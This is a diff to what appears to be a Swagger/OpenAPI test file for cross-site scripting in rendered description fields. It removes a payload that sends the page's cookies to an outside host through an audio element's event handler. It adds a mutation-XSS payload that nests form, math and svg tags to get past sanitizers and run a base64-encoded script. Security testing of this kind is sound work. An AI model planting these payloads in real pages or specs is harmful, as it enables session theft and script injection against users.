@@ -6,7 +6,8 @@ securityDefinitions:
 info:
   version: "1.0.0"
   title: XSS img test
-  description: test <audio autoplay onloadstart=this.src='hxxps://msf.fun/?c='+document["cook"+"ie"]' src=x>
+  description: test <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgndXgxcCcpPC9zY3JpcHQ+'></object>"></form>
+
 paths:
   /:
     get:
